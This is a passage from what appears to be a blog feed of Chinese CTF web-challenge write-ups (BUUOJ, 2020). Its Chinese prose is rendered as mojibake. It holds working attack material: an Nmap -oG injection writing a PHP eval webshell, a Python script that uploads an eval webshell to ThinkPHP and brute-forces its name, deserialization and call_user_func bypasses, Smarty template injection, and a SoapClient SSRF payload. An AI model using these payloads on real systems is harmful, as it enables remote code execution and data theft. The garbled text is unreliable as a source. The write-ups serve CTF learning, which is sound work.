<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"15000000000"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"woc2@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>&#123;i:<span class="number">0</span>;s:<span class="number">204</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;</span><br><span class="line">è¿™é‡Œ<span class="number">34</span>ä¸ªwhereåŠ ä¸Š<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;ä¸€å…±204ä¸ªå­—ç¬¦ï¼Œåœ¨filteræ–¹æ³•é‡Œ34ä¸ªwhereä¼šè¢«hackeræ›¿ä»£ï¼Œ34ä¸ªhackerå°±æœ‰204ä¸ªå­—ç¬¦æ­¤æ—¶ï¼Œ"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;ä¸å†æ˜¯ä¸€å¤§ä¸²whereçš„ä¸€éƒ¨åˆ†ï¼Œs:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>ä¹Ÿä¸æ˜¯ç®€å•çš„å­—ç¬¦ä¸²äº†ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¼šè¢«è§£ææˆprofile[<span class="string">'photo'</span>]=<span class="string">'config.php'</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å°±æ˜¯æ³¨å†Œç™»å½•æ›´æ–°ä¿¡æ¯ï¼Œåœ¨profile.phpä¸­æ‹¿åˆ°base64ç ï¼Œè§£å¯†æ‹¿åˆ°flag</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj4</title>
    <url>/2020/05/29/buuoj4/</url>
    <content><![CDATA[<h3 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h3><a id="more"></a>

<p>å¼€é¢˜ï¼Œæºç å¤„æœ‰æç¤ºï¼Œgoogleï¼Œå¥½åƒæ˜¯php.iniä¸­çš„è®¾ç½®ä¸å¯¹</p>
<p>æŠ“åŒ…ï¼Œæœ‰å‘ç°</p>
<img src="/2020/05/29/buuoj4/1.png" class="">

<p>func=?&amp;p=?,è¿™é‡Œå‰é¢çš„åº”è¯¥æ˜¯å¡«å‡½æ•°ï¼Œåé¢æ˜¯å†…å®¹ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œæœç„¶è¡Œçš„é€šï¼Œè¯»å–ä¸€ä¸‹index.phpæ–‡ä»¶å§</p>
<p>è¿™é‡Œç”¨readfileæˆ–è€…file_get_contents,postäº¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func&#x3D;file_get_contents&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¸è¿‡çœ‹åˆ°äº†é­”æœ¯æ–¹æ³•ï¼Œåº”è¯¥å¯ä»¥ç”¨ååºåˆ—åŒ–çš„æ–¹æ³•è¾¾åˆ°ç›®çš„</p>
<p>è¿™é‡Œå­¦åˆ°ä¸€ä¸ªå¾ˆé‡è¦çš„çŸ¥è¯†ç‚¹ï¼Œèœé¸¡ç°åœ¨æ‰çŸ¥é“ï¼ï¼ï¼</p>
<p><strong>ä¸åœ¨é»‘ç›’ä¸­çš„é­”æœ¯æ–¹æ³•ç”¨ååºåˆ—åŒ–çš„æ•°æ®å¯ä»¥ç»•è¿‡é»‘ç›’å¯¹å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„ç»•è¿‡ï¼ï¼ï¼</strong></p>
<p>å­¦åˆ°äº†å­¦åˆ°äº†ï¼Œæ‹¿è¿™é¢˜å°±ç®€å•äº†ï¼Œå…ˆè¯»å–ä¸€ä¸‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶æœ‰å“ªäº›å§</p>
<img src="/2020/05/29/buuoj4/2.png" class="">

<p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰flagæ–‡ä»¶ï¼Œé‚£å°±ç¨ç¨æ‰¾æ‰¾ï¼Œåœ¨/tmpç›®å½•ä¸‹æ‰¾åˆ°äº†ï¼Œä¸‹é¢å°±è¯»å–å§ï¼Œè¿™é‡Œæœ‰ç‚¹å°é—®é¢˜ï¼Œæˆ‘ç”¨readfileè¯»ä¸å‡ºï¼Œæƒ³æƒ³è¿˜æ˜¯ç”¨åºåˆ—åŒ–å§hhh</p>
<img src="/2020/05/29/buuoj4/3.png" class="">

<h3 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h3><img src="/2020/05/29/buuoj4/4.png" class="">

<p>nmapï¼Œæ‰¾æ‰¾nmapçš„å¸¸ç”¨å‘½ä»¤ï¼Œ-oGï¼Œå°†ç»“æœGrepä¿å­˜ï¼Œæ„é€ ä¸€å¥è¯æœ¨é©¬ï¼Œç”¨-oGä¿å­˜åˆ°æ–‡ä»¶ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure>

<p>å¼¹çª—hackerï¼Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ä»€ä¹ˆï¼Œfuzzï¼Œphpè¢«è¿‡æ»¤äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">' &lt;?= @eval($_POST["hack"]);?&gt; -oG hack.phtml '</span></span><br></pre></td></tr></table></figure>

<img src="/2020/05/29/buuoj4/5.png" class="">

<p>å°è¯•è®¿é—®æˆ‘ä»¬æ‰“ä¸Šå»çš„æ–‡ä»¶ï¼Œå¹¶ä¸”ç»™hackä¼ å€¼</p>
<img src="/2020/05/29/buuoj4/6.png" class="">

<p>æˆåŠŸæ˜¾ç¤ºphpinfoé¡µé¢ï¼Œç›´æ¥è¯»flagå§</p>
<img src="/2020/05/29/buuoj4/7.png" class="">

<h3 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h3><p>å¼€é¢˜</p>
<img src="/2020/05/29/buuoj4/8.png" class="">

<p>smartyæ¨¡æ¿å†™çš„ï¼Œåˆæç¤ºXFFï¼Œå¥½åƒå’Œä¹‹å‰BJDé‚£é“å·®ä¸å¤šï¼ŒæŠ“åŒ…æµ‹è¯•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-Forï¼š&#123;7+7&#125;</span><br><span class="line">&#x2F;&#x2F;&#x2F;åœ¨client-ipå¤„å›æ˜¾14</span><br></pre></td></tr></table></figure>

<p>æ‰¾ä¸€ä¸‹smartyæ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œæ‹¿æ¥ç›´æ¥ç”¨ï¼Œç›´æ¥èƒ½è¯»åˆ°æ ¹ç›®å½•ä¸‹çš„flag</p>
<h3 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±»</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹äº†å¸ˆå‚…ä»¬çš„wpï¼Œè·Ÿç€åšçš„ï¼Œå­¦ä¹ ä¸€ä¸‹</p>
<p><strong>1ï¼šThink PHPä¸Šä¼ é»˜è®¤è·¯å¾„</strong></p>
<p>é»˜è®¤ä¸Šä¼ è·¯å¾„æ˜¯/home/index/upload</p>
<p><strong>2ï¼šThink PHP upload()å¤šæ–‡ä»¶ä¸Šä¼ </strong> think PHPé‡Œçš„upload()å‡½æ•°åœ¨ä¸ä¼ å‚çš„æƒ…å†µä¸‹æ˜¯æ‰¹é‡ä¸Šä¼ çš„ï¼Œè¿™é‡Œå¯ä»¥ç†è§£ä¸ºé˜²æŠ¤æœºåˆ¶åªä¼šæ£€æµ‹ä¸€æ¬¡ï¼Œè¿ç”¨æ¡ä»¶ç«äº‰ï¼Œå¤šæ¬¡ä¸Šä¼ ä¾¿å¯ä»¥ç»•è¿‡æ–‡ä»¶åç¼€çš„æ£€æµ‹ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸Šä¼ ä¸¤æ¬¡1.txt,æ˜¯ä¸ºäº†è·å–phpæ–‡ä»¶çš„åç¼€ï¼Œå› ä¸ºè¿™é‡Œçš„åç¼€å‘½åæ–¹å¼è¿ç”¨äº†<strong>uniqidå‡½æ•°</strong>å®ƒæ˜¯åŸºäºå¾®ç§’çš„å½“å‰æ—¶é—´æ¥æ›´æ”¹æ–‡ä»¶åçš„ï¼Œä¸¤ä¸ªåŒæ—¶ä¸Šä¼ ç”Ÿæˆçš„æ–‡ä»¶åç›¸å·®ä¸ä¼šå¤ªè¿œã€‚ </p>
<p><strong>3</strong>.<strong>ThinkPHP ä¸Šä¼ æ–‡ä»¶åçˆ†ç ´</strong></p>
<p>å…ˆä¸Šä¼ ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶å†ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶ï¼Œç„¶åæ ¹æ®ç¬¬ä¸€å’Œç¬¬ä¸‰ä¸ªæ­£å¸¸æ–‡ä»¶çš„æ–‡ä»¶åä¹‹é—´çš„å·®å¼‚ï¼Œçˆ†ç ´å‡ºæˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 pyrhon2</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">"http://1b021a4c-b72d-4066-a7c8-d04b3a25da01.node3.buuoj.cn/"</span></span><br><span class="line">path = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>:(<span class="string">"a.txt"</span>,<span class="string">'a'</span>), <span class="string">"file1"</span>:(<span class="string">"b.php"</span>, <span class="string">'&lt;?php eval($_GET["a"]);'</span>)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line">param=json.loads(r.content)</span><br><span class="line"><span class="keyword">print</span> param</span><br><span class="line">t1 = int(t1, <span class="number">16</span>)</span><br><span class="line">j = t1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = url + <span class="string">"/Public/Uploads/"</span>+param[<span class="string">'url'</span>].split(<span class="string">"/"</span>)[<span class="number">-2</span>]+<span class="string">"/%s.php"</span> % hex(j)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(path,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">429</span>:<span class="comment">#è§„é¿è¿‡äºé¢‘ç¹è®¿é—®å¯¼è‡´çš„429</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span> path</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> j, path, r.status_code</span><br><span class="line">    j -= <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="LCTF-bestphpâ€™s-revengeï¼ˆæ–°çŸ¥è¯†ï¼‰"><a href="#LCTF-bestphpâ€™s-revengeï¼ˆæ–°çŸ¥è¯†ï¼‰" class="headerlink" title="[LCTF]bestphpâ€™s revengeï¼ˆæ–°çŸ¥è¯†ï¼‰"></a>[LCTF]bestphpâ€™s revengeï¼ˆæ–°çŸ¥è¯†ï¼‰</h3><p>å¼€é¢˜ï¼Œç»™äº†æºç ï¼Œå®¡è®¡</p>
<p>çŸ¥è¯†ç‚¹ï¼š</p>
<p>1ã€SoapClientååºåˆ—åŒ–å¯¼è‡´SSRF</p>
<p>2ã€serialize_handlerå¤„ç†sessionçš„æ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥</p>
<p>3ã€crlfæ¼æ´</p>
<p>SoapClientç®€ä»‹ï¼š</p>
<p>SOAPä½œä¸ºwebServiceä¸‰è¦ç´ ï¼ˆSOAPã€WSDL(WebServicesDescriptionLanguage)ã€UDDI(UniversalDescriptionDiscovery andIntegration)ï¼‰ä¹‹ä¸€ï¼šWSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ï¼Œ UDDIç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢webService ï¼ŒSOAP å¯ä»¥å’Œç°å­˜çš„è®¸å¤šå› ç‰¹ç½‘åè®®å’Œæ ¼å¼ç»“åˆä½¿ç”¨ï¼ŒåŒ…æ‹¬è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHTTPï¼‰ï¼Œç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼ˆSMTPï¼‰ï¼Œå¤šç”¨é€”ç½‘é™…é‚®ä»¶æ‰©å……åè®®ï¼ˆMIMEï¼‰ã€‚ï¼ˆ<a href="https://www.anquanke.com/post/id/153065#h2-1ï¼‰è¿™ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-1ï¼‰è¿™ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†</a></p>
<p>crlfå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼ˆ<a href="https://www.jianshu.com/p/d4c304dbd0afï¼‰" target="_blank" rel="noopener">https://www.jianshu.com/p/d4c304dbd0afï¼‰</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨å›è°ƒå‡½æ•°è¦†ç›–sessionåºåˆ—åŒ–å¼•æ“ä¸ºphp_serilazeï¼Œæ„é€ SSRFçš„Soapç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é…åˆåºåˆ—åŒ–æ³¨å…¥å†™å…¥sessionæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´ï¼Œè¦†ç›–æ‰å˜é‡bä¸ºå›è°ƒå‡½æ•°call_user_funcï¼Œæ­¤æ—¶ç»“åˆæˆ‘åˆšå¼€å§‹æ‰€è¯´çš„å›è°ƒå‡½æ•°è°ƒç”¨Soapç±»çš„æœªçŸ¥æ–¹æ³•ï¼Œè§¦å‘__callæ–¹æ³•è¿›è¡ŒSSRFè®¿é—®flag.phpã€‚æŠŠflagå†™å…¥sessionï¼Œå†æŠŠsessionæ‰“å°å‡ºæ¥å³å¯ã€‚</p>
<p>å‘ç°flag.phpé¡µé¢å¯ä»¥è®¿é—®ï¼Œç»™äº†æç¤º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">only localhost can get flag!session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>



<p>å…·ä½“çš„çŸ¥è¯†ç‚¹è®²è§£å¯ä»¥çœ‹çœ‹åˆ«çš„å¸ˆå‚…çš„ï¼Œä¸çŸ¥é“è¯¥å¦‚ä½•è¡¨è¿°ï¼Œå°±ç›´æ¥å°±å¼€å§‹åšé¢˜å§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"htpp://127.0.0.1/flag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;$url,<span class="string">'location'</span>=&gt;$url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>,<span class="string">""</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"|"</span>.urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨æœ¬åœ°ç¯å¢ƒç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼Œæ‰“ä¸Šå»</p>
<img src="/2020/05/29/buuoj4/10.png" class="">

<img src="/2020/05/29/buuoj4/11.png" class="">

<img src="/2020/05/29/buuoj4/12.png" class="">

<h3 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>å¯¹jsonæ•°æ®è¿›è¡Œè§£ç ï¼Œå†ç»è¿‡is_validè¿‡æ»¤ï¼Œfile_get_contentsåŒ…å«æ–‡ä»¶å†…å®¹ä¹‹ååˆç»è¿‡äº†ä¸€æ¬¡è¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥ç”¨unicodeç¼–ç è¿›è¡Œç»•è¿‡ï¼Œç”¨phpä¼ªåè®®è¯»å–æ•°æ®</p>
<img src="/2020/05/29/buuoj4/13.png" class="">

<p>æ•°æ®base64è§£ç å°±æ˜¯flag</p>
<h3 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h3><p>çœ‹åˆ°é¢˜ç›®ç¬¬ä¸€çœ¼ï¼Œå°±æƒ³åˆ°åº”è¯¥æ˜¯é€ƒé€¸é¢˜ï¼Œå¼€é¢˜çœ‹çœ‹å§</p>
<img src="/2020/05/29/buuoj4/14.png" class="">

<p>çœ‹è¿™ä¸ªæç¤ºï¼Œä¸ç¡®å®šæ˜¯ä¸æ˜¯phpï¼Œè®¿é—®ä¸€ä¸‹run online</p>
